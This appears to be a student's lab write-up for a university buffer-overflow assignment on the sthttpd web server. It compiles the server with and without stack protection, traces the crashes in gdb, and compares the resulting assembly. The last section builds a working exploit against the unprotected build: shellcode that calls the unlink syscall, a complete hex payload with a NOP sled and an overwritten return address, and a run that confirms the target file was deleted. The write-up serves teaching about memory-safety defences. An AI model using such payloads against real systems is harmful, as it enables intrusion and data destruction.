@@ -1,0 +1,387 @@
+1.
+check the PATH
+which gcc
+/usr/bin/gcc
+
+change to the correct one
+PATH=/usr/local/cs/bin:$PATH; export PATH
+
+2.
+download the sthttpd 
+wget "http://web.cs.ucla.edu/classes/fall17/cs33/lab/sthttpd-2.27.0.tar.gz"
+
+unzip it
+tar -xvzf sthttpd-2.27.0.tar.gz
+
+patch the file according to the instruction on CS33 website
+emacs sthttpd-2.27.0/src/thttpd.c
+emacs sthttpd-2.27.0/src/libhttpd.c
+
+build the sthttpd
+cd sthttpd-2.27.0/
+./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+3&4.
+calculate the ports first
+SP 12340
+AS 12341
+NO 12342
+
+create a foo.txt that only contains "this is a test"
+
+run the modified sthttpd and open another terminal to check
+src/thttpd-sp -p 12340 -D
+curl http://localhost:12340/foo.txt
+this is a test
+
+src/thttpd-as -p 12341 -D
+curl http://localhost:12341/foo.txt
+this is a test
+
+src/thttpd-no -p 12342 -D
+curl http://localhost:12342/foo.txt
+this is a test
+
+5.
+create a file that have more than 100 char, which can make the program crash
+touch attack.txt
+
+the attack.txt have
+port=qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjkzxcvbnmqwertyuiopasdfghjklzxcvbnmwsdfgbhnmxzsdcfvgbhnjexdcrfvgbhnjrftgybunj
+
+run the program with GDB
+gdb src/thttpd-sp
+(gdb) run -p 12340 -D -C attack.txt
+Starting program:
+/w/home.20/class/classboy/CS33/SmashingLab/sthttpd-2.27.0/src/thttpd-sp -p 12340
+-D -C attack.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***:
+/w/home.20/class/classboy/CS33/SmashingLab/sthttpd-2.27.0/src/thttpd-sp
+terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-196.el7.x86_64
+libgcc-4.8.5-16.el7.x86_64 nss-softokn-freebl-3.28.3-8.el7_4.x86_64
+
+get the backtrace
+(gdb) bt
+#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404edd in read_config (filename=<optimized out>) at
+thttpd.c:1190
+#7  0x72636478656a6e68 in ?? ()
+#8  0x726a6e6862677666 in ?? ()
+#9  0x6a6e756279677466 in ?? ()
+#10 0x00007fffffff0000 in ?? ()
+#11 0x00007fffffffd0e0 in ?? ()
+#12 0x00007fffffffe300 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+it seems that something near the 1190 line of thttpd.c caused the
+__stack_chk_fail (), so set break point there. And set disassemble next line on
+(gdb) break thttpd.c:1190
+(gdb) set disassemble-next-line on
+
+run the program again
+(gdb) r -p 12340 -D -C attack.txt
+=> 0x0000000000404e10 <read_config+1120>:       48 8b 44 24 68  mov
+0x68(%rsp),%rax
+   0x0000000000404e15 <read_config+1125>:       64 48 33 04 25 28 00 00 00
+   xor    %fs:0x28,%rax
+   0x0000000000404e1e <read_config+1134>:       0f 85 b4 00 00 00       jne
+   0x404ed8 <read_config+1320>
+   0x0000000000404e24 <read_config+1140>:       48 83 c4 70     add
+   $0x70,%rsp
+   0x0000000000404e28 <read_config+1144>:       5b      pop    %rbx
+   0x0000000000404e29 <read_config+1145>:       5d      pop    %rbp
+   0x0000000000404e2a <read_config+1146>:       41 5c   pop    %r12
+   0x0000000000404e2c <read_config+1148>:       41 5d   pop    %r13
+   0x0000000000404e2e <read_config+1150>:       41 5e   pop    %r14
+   0x0000000000404e30 <read_config+1152>:       c3      retq
+
+clearly, the canary value is checked and if it is changed(not equal), the
+program will jump to <read_config+1320>.
+by using (gdb) si,I find the read_config+1320 is
+0x0000000000404ed8 <read_config+1320>:       e8 a3 d5 ff ff  callq  0x402480
+<__stack_chk_fail@plt>
+this call the function that handle stack check fail
+
+6.
+test the thttpd-as
+gdb src/thttpd-as
+(gdb) r -p 12341 -D -C attack.txt
+==12228==ERROR: AddressSanitizer: stack-buffer-overflow on address
+0x7fffffffcec4 at pc 0x000000441de4 bp 0x7fffffffce20 sp 0x7fffffffc5d0
+READ of size 108 at 0x7fffffffcec4 thread T0
+    #0 0x441de3 in __interceptor_strchr
+    ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+    #1 0x4feb57 in read_config
+    /u/eng/class/classboy/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4ff666 in parse_args
+    /u/eng/class/classboy/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x408826 in main /u/eng/class/classboy/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7ffff6cc2c04 in __libc_start_main (/lib64/libc.so.6+0x21c04)
+    #5 0x409a69
+    (/w/home.20/class/classboy/sthttpd-2.27.0/src/thttpd-as+0x409a69)
+this time it is the line 1018 in thttpd.c
+
+set break point at the line and set disassemble next line on
+(gdb) b thttpd.c:1018
+(gdb) set disassemble-next-line on
+
+run the program again
+(gdb) r -p 12341 -D -C attack.txt
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1018
+1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+=> 0x00000000004feb4b <read_config+171>:        be 23 00 00 00  mov
+$0x23,%esi
+   0x00000000004feb50 <read_config+176>:        4c 89 e7        mov    %r12,%rdi
+   0x00000000004feb53 <read_config+179>:
+    e8 f8 34 f4 ff      callq  0x442050 <__interceptor_strchr(char const*, int)>
+the program call __interceptor_strchr(char const*, int) which handles the stack
+buffer overflow. According to the document, AddressSanitizer checks the stack
+buffer overflow by comparing the shadow bytes.
+
+7.
+check the thttpd-no, this time I have to use a new file to introduce problem
+touch attack
+the attack have over a hundred tabs
+
+test the program
+gdb src/thttpd-no
+(gdb) r -p 12342 -D -C attack
+Starting program: /w/home.20/class/classboy/sthttpd-2.27.0/src/thttpd-no -p
+12342 -D -C attack
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+
+check the backtrace
+(gdb) bt
+#0  0x0000000000404c8c in read_config (filename=<optimized out>) at
+thttpd.c:1190
+#1  0x2020202020202020 in ?? ()
+#2  0x2020202020202020 in ?? ()
+#3  0x2020202020202020 in ?? ()
+#4  0x2020202020202020 in ?? ()
+#5  0x2020202020202020 in ?? ()
+#6  0x2020202020202020 in ?? ()
+#7  0x2020202020202020 in ?? ()
+#8  0x2020202020202020 in ?? ()
+#9  0x2020202020202020 in ?? ()
+#10 0x2020202020202020 in ?? ()
+#11 0x2020202020202020 in ?? ()
+#12 0x2020202020202020 in ?? ()
+#13 0x2020202020202020 in ?? ()
+#14 0x2020202020202020 in ?? ()
+#15 0x2020202020202020 in ?? ()
+#16 0x2020202020202020 in ?? ()
+#17 0x2020202020202020 in ?? ()
+#18 0x2020202020202020 in ?? ()
+#19 0x2020202020202020 in ?? ()
+#20 0x2020202020202020 in ?? ()
+#21 0x2020202020202020 in ?? ()
+#22 0x2020202020202020 in ?? ()
+#23 0x2020202020202020 in ?? ()
+#24 0x2020202020202020 in ?? ()
+#25 0x2020202020202020 in ?? ()
+#26 0x2020202020202020 in ?? ()
+#27 0x2020202020202020 in ?? ()
+#28 0x2020202020202020 in ?? ()
+#29 0x2020202000202020 in ?? ()
+#30 0x2020202020202020 in ?? ()
+#31 0x2020202020202020 in ?? ()
+#32 0x2020202020202020 in ?? ()
+#33 0x2020202020202020 in ?? ()
+#34 0x2020202020202020 in ?? ()
+#35 0x2020202020202020 in ?? ()
+#36 0x2020202020202020 in ?? ()
+#37 0x2020202020202020 in ?? ()
+#38 0x2020202020202020 in ?? ()
+#39 0x2020202020202020 in ?? ()
+#40 0x2020202020202020 in ?? ()
+#41 0x2020202020202020 in ?? ()
+#42 0x2020202020202020 in ?? ()
+#43 0x2020202020202020 in ?? ()
+#44 0x2020202020202020 in ?? ()
+#45 0x2020202020202020 in ?? ()
+#46 0x2020202020202020 in ?? ()
+#47 0x2020202020202020 in ?? ()
+#48 0x2020202020202020 in ?? ()
+#49 0x2020202020202020 in ?? ()
+#50 0x2020202020202020 in ?? ()
+#51 0x2020202020202020 in ?? ()
+#52 0x2020202020202020 in ?? ()
+#53 0x2020202020202020 in ?? ()
+the return address have been overwritten by the attack file
+
+8.
+compile the file
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+Analyze the assembly code
+No protection
+This assembly file is the shortest, because it doesn't have anything that check
+stack overflow. 
+
+Strong Protection
+the strong protection insert many code similar to the one shown below (this
+example is around line 559 of the code)
+    	movq    8(%rsp), %rax
+        xorq    %fs:40, %rax
+        movl    %r12d, (%rbx)
+        jne     .L85
+...
+.L85:
+        call    __stack_chk_fail
+The strong protection put canary value into the stack and check if it has been
+change. In the assembly code shown above, the xorq checks canary value and if is has been changed, the jne will jump
+to the place that call __stack_chk_fail (in this case .L85)
+
+Address Fsanitize
+the Address Fsanitize insert many code similar to the one shown below (this
+example is around line 116 and 391 of the code)
+.L87:
+        movq    %rcx, %rsi
+        leaq    (%r9,%r9), %rdx
+        shrq    $3, %rsi
+        cmpb    $0, 2147450880(%rsi)
+        jne     .L78
+...
+.L78:
+        movq    %rcx, %rdi
+        call    __asan_report_load8
+-fsanitize=address puts shadow memory around the buffer, and the code will check
+the shadow memories whenever one need to access memory. this makes sure that the
+buffer can  not overflowed. In the asssembly code shown above, it compares 0
+with 2147450880(%rsi) and if is not equal, it will jump to .L78, which will call
+__asan_report_load8 to handle the stack overflow.
+
+9.
+use the gdb to find the size of buffer from the start of the array to the return
+address.
+gdb thttpd-no
+(gdb) b read_config
+(gdb) r -p 12342 -D -C foo.txt
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffd000
+(gdb) i r rsp
+rsp            0x7fffffffd098   0x7fffffffd098
+
+0x7fffffffd098 - 0x7fffffffd000 = 0x98 = 152
+so there are 152 bytes that we must fill and overflow
+
+to find the representation "target.txt", I created a file target.txt with the
+content of target.txt, then use xdd command
+xdd target.txt
+0000000: 7461 7267 6574 2e74 7874 0a
+the last 0a is \n which I do not need, so the value should be
+74 61 72 67 65 74 2e 74 78 74 00
+
+the "target.txt" is 11 bytes long and to make it aligned I need to add 5 bytes
+at the end. I decide to put it at the address 0x7fffffffd098 - 16 = 0x7fffffffd088
+
+
+find out how unlink work
+(gdb) disas /r unlink
+I find
+0x00007ffff76c3f70 <+0>:     b8 57 00 00 00  mov    $0x57,%eax
+0x00007ffff76c3f75 <+5>:     0f 05   syscall
+so I need to put 0x57 into %eax before the syscall
+
+I write my own code of unlink.s
+movq  $0x7fffffffd088, %rdi
+movq  $0x57, %rax
+syscall
+
+I compile the code and then object dump it
+gcc -c unlink.s
+objdump -d unlink.o
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 bf 88 d0 ff ff ff    movabs $0x7fffffffd088,%rdi
+   7:   7f 00 00
+   a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+  11:   0f 05                   syscall
+
+I find the representation of "port=" by make a file named port.txt whose content
+is port=, then I use xxd
+xxd port.txt
+706f 7274 3d0a
+similarly, the 0a is \n so we don't need it, and we need to make it aligned
+70 6f 72 74 3d 00 00 00
+
+so the exploit code is
+70 6f 72 74 3d 00 00 00 48 bf 88 d0 ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+the address of exploit code is 
+0x7fffffffd000 + 8 = 0x7fffffffd008
+so the representattion of "target.txt" and the address of exploit code add up
+(with proper alignment) is
+74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 08 d0 ff ff ff 7f 00 00
+
+now everything is ready except that we need to add instructions to fill the 152
+byte (160 if plus the return address). I use 90 which is nop
+so the code should be (with proper format)
+0000000: 70 6f 72 74 3d 00 00 00 48 bf 88 d0 ff ff ff 7f
+0000010: 00 00 48 c7 c0 57 00 00 00 0f 05 90 90 90 90 90
+0000020: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000030: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000040: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000050: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000060: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000070: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000080: 90 90 90 90 90 90 90 90 74 61 72 67 65 74 2e 74
+0000090: 78 74 00 00 00 00 00 00 08 d0 ff ff ff 7f 00 00
+
+I put this to exp.txt and change it to raw.txt use xxd
+xxd -r exp.txt raw.txt
+
+I run the program with gdb
+gdb thttpd-no
+(gdb) run -p 12342 -D -C raw.txt
+Starting program: /w/home.20/class/classboy/sthttpd-2.27.0/src/thttpd-no -p
+12342 -D -C raw.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffd093 in ?? ()
+
+I quite the gdb and check if target is deleted
+ls target.txt
+ls: cannot access target.txt: No such file or directory
+Success!
